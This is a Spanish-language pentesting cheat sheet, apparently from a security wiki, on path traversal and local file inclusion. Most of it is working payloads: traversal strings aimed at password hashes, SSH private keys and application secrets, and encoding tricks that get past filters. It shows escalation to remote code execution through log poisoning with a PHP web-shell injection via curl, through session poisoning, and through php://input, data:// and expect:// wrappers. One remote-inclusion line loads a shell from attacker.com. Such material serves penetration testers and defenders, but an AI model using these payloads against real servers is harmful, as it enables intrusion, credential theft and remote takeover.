---
icon: lock-keyhole-open
---

# Path Traversal

Path Traversal o Directory Traversal permite a un atacante salir del directorio base de la aplicación y leer archivos arbitrarios del sistema de archivos del servidor usando secuencias `../`.

```
Intención de la app:
/var/www/html/uploads/ + "report.pdf" = /var/www/html/uploads/report.pdf

Con payload:
/var/www/html/uploads/ + "../../../../etc/passwd" = /etc/passwd 
```

### Puntos de inyección

```
Parámetros GET:
?file=report.pdf
?path=docs/manual.pdf
?page=about
?template=home
?img=avatar.jpg
?download=invoice_1042.pdf
?load=config
?include=header.php

Rutas en la URL:
/files/report.pdf
/static/img/logo.png
/download/invoice_1042.pdf

Cabeceras HTTP:
Referer: https://target.com/files/report.pdf
X-File-Path: /docs/manual.pdf

Cuerpo de petición:
{"filename": "report.pdf"}
{"template": "invoice"}
{"path": "/uploads/avatar.jpg"}
```

### Payload base

```
../          → subir un nivel de directorio
../../       → subir dos niveles
../../../    → subir tres niveles

Objetivo: llegar a la raíz del sistema (/) y desde ahí ir a cualquier archivo
```

#### Archivos objetivo en Linux

```bash
# Archivos críticos de sistema
../../../etc/passwd           # Usuarios del sistema
../../../etc/shadow           # Hashes de contraseñas (requiere root)
../../../etc/hosts            # Resolución DNS local
../../../etc/hostname         # Nombre del host
../../../etc/os-release       # Versión del OS
../../../etc/crontab          # Cron jobs del sistema
../../../etc/cron.d/          # Cron jobs adicionales
../../../proc/version         # Versión del kernel
../../../proc/cmdline         # Argumentos de arranque
../../../proc/net/tcp         # Conexiones TCP (puertos abiertos)

# Claves y configuración SSH
../../../home/usuario/.ssh/id_rsa        # Clave privada SSH
../../../home/usuario/.ssh/authorized_keys
../../../root/.ssh/id_rsa
../../../root/.ssh/authorized_keys

# Historial de comandos
../../../home/usuario/.bash_history
../../../root/.bash_history

# Configuración de servicios web
../../../var/www/html/config.php
../../../var/www/html/wp-config.php       # WordPress
../../../var/www/html/.env               # Laravel, Django, Node
../../../etc/apache2/apache2.conf
../../../etc/apache2/sites-enabled/000-default.conf
../../../etc/nginx/nginx.conf
../../../etc/nginx/sites-enabled/default

# Logs (information disclosure)
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/nginx/access.log
../../../var/log/auth.log                # Intentos de login SSH
```

#### Archivos objetivo en Windows

```
..\..\..\Windows\win.ini
..\..\..\Windows\System32\drivers\etc\hosts
..\..\..\Windows\System32\config\SAM
..\..\..\inetpub\wwwroot\web.config
..\..\..\Users\Administrator\Desktop\flags.txt
..\..\..\Program Files\Apache Group\Apache\conf\httpd.conf

# Con forward slash (también funciona en Windows)
../../../Windows/win.ini
../../../Windows/System32/drivers/etc/hosts
```

### Bypass de filtros

#### 1. Encoding

```
# URL encoding
../   →  %2e%2e%2f
../   →  %2e%2e/
../   →  ..%2f
../   →  %2e%2e%5c   (backslash Windows)

# Double URL encoding (cuando el servidor decodifica dos veces)
../   →  %252e%252e%252f
%2e  →  %252e
%2f  →  %252f

# Unicode / UTF-8 overlong encoding
../   →  ..%c0%af
../   →  ..%ef%bc%8f
../   →  %c0%ae%c0%ae/

# Ejemplos completos
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
?file=..%2f..%2f..%2fetc%2fpasswd
```

#### 2. Bypass de filtros que eliminan `../`

```
# Si el filtro hace: replace('../', '')
....//     → al eliminar ../ queda ../   ← traversal válido
....\/     → al eliminar ../ queda ..\
..../      → elimina ../ interno → ../

# Ejemplos
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..././../etc/passwd
```

#### 3. Bypass de extensión forzada

```
# Si la app añade .php al final: $file . ".php"
# Null byte injection (PHP < 5.3.4)
?file=../../../etc/passwd%00
?file=../../../etc/passwd%00.jpg
?file=../../../etc/passwd\0
```

#### 4. Bypass de filtro de ruta base

```
# Si la app verifica que la ruta empieza por /var/www/html/
# Usar ruta absoluta
?file=/var/www/html/../../../etc/passwd
?file=/var/www/html/../../../../etc/passwd

# Ruta válida seguida de traversal
?file=/var/www/html/uploads/../../../etc/passwd
```

#### 5. Bypass con backslash (Windows)

```
..\..\..\Windows\win.ini
..\..\..\/Windows/win.ini
..\\..\\..\Windows\win.ini
```

#### 6. Bypass de longitud máxima

```
# Algunos filtros truncan el path si es muy largo
# Llenar con ./././ hasta que el filtro recorte y quede el traversal
./././././././././././././././././././././././././././././../../../etc/passwd
```

### Path Traversal → LFI → RCE

Si el path traversal permite cargar código que se ejecuta (LFI — Local File Inclusion), se puede escalar a RCE.

#### LFI via Log Poisoning

```bash
# 1. Verificar que podemos leer el log de acceso
?file=../../../var/log/apache2/access.log
# → Si vemos el log en pantalla → vulnerable a log poisoning

# 2. Inyectar código PHP en el log via User-Agent
curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/

# 3. Incluir el log con el parámetro de ejecución
?file=../../../var/log/apache2/access.log&cmd=id
?file=../../../var/log/apache2/access.log&cmd=whoami
?file=../../../var/log/apache2/access.log&cmd=cat+/etc/shadow

# Otros logs inyectables:
../../../var/log/nginx/access.log
../../../var/log/auth.log    → inyectar via intento SSH con usuario malicioso
../../../proc/self/environ   → inyectar via User-Agent (si environ es legible)
```

#### LFI via /proc/self/fd

```bash
# /proc/self/fd/N apunta a los file descriptors del proceso actual
# Si el web server tiene abierto un archivo con código inyectado:
?file=../../../proc/self/fd/0
?file=../../../proc/self/fd/1
# Iterar sobre fd 0-20
```

#### LFI via PHP session

```bash
# 1. Crear sesión PHP con payload en el valor de un parámetro
# Los ficheros de sesión PHP se guardan en /tmp/sess_SESSIONID
curl -s "http://target.com/page.php?name=<?php system(\$_GET['cmd']); ?>"
# Obtener PHPSESSID de la cookie

# 2. Incluir el fichero de sesión
?file=../../../tmp/sess_PHPSESSID_VALUE&cmd=id
```

#### LFI via PHP wrappers

```bash
# php://filter — leer archivos PHP en base64 (sin ejecutarlos)
?file=php://filter/convert.base64-encode/resource=index.php
# Decodificar: base64 -d <<< "SALIDA_BASE64"

# php://filter — leer cualquier archivo
?file=php://filter/read=string.rot13/resource=../../../etc/passwd

# php://input — ejecutar PHP del cuerpo de la petición (requiere allow_url_include)
?file=php://input
# Body: <?php system('id'); ?>

# data:// — ejecutar PHP inline
?file=data://text/plain,<?php system('id');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# expect:// — RCE directo (requiere extensión expect)
?file=expect://id
?file=expect://whoami
```

### Path Traversal en descarga de archivos

```http
-- Descarga normal --
GET /download?file=invoice_1042.pdf HTTP/1.1
→ Content-Disposition: attachment; filename="invoice_1042.pdf"

-- Path traversal --
GET /download?file=../../../etc/passwd HTTP/1.1
→ Content-Disposition: attachment; filename="passwd"
→ Body: root:x:0:0:root:/root:/bin/bash ...

-- Si hay validación de extensión --
GET /download?file=../../../etc/passwd%00.pdf HTTP/1.1
GET /download?file=../../../etc/passwd%2500.pdf HTTP/1.1
```

### Detección automática

```bash
# ffuf — fuzzing de path traversal en parámetros
ffuf -u "https://target.com/download?file=FUZZ" \
    -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
    -fw 0     # Filtrar respuestas vacías

# Burp Intruder — con lista de payloads de traversal
# Lista recomendada: SecLists/Fuzzing/LFI/LFI-Jhaddix.txt

# dotdotpwn — herramienta específica para path traversal
dotdotpwn -m http -h target.com -M GET -u "http://target.com/download?file=TRAVERSAL" -f /etc/passwd -k "root:"
```

### Diferencia Path Traversal vs LFI vs RFI

```
Path Traversal → leer archivos del sistema (no los ejecuta)
                 ?file=../../../../etc/passwd → muestra el contenido

LFI            → incluir y EJECUTAR archivos locales del servidor
                 ?page=../../../var/log/apache2/access.log → ejecuta PHP del log

RFI            → incluir y ejecutar archivos de un servidor REMOTO
                 ?page=http://attacker.com/shell.php → ejecuta shell remota
                 (requiere allow_url_include=On en PHP — cada vez más raro)
```

### Cheatsheet de payloads

```
Linux básico:
../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252f%252fetc%252fpasswd

Windows básico:
..\..\..\Windows\win.ini
..%5c..%5c..%5cWindows%5cwin.ini
%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini

PHP wrappers:
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../../../etc/passwd
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
expect://id
```

> Siempre probar primero con `../../../etc/passwd` en Linux y `..\..\..\Windows\win.ini` en Windows — si alguno funciona sin encoding, el filtro es inexistente o muy básico.

> Si el traversal básico da 403 o respuesta vacía pero no error, probar las variantes de encoding — muchos filtros bloquean `../` literal pero no `..%2f` o `....//`.

> LFI vía log poisoning es destructivo si se inyectan payloads en logs de producción — en pentests reales, confirmar la vulnerabilidad con `<?php phpinfo(); ?>` antes de usar payloads más agresivos.
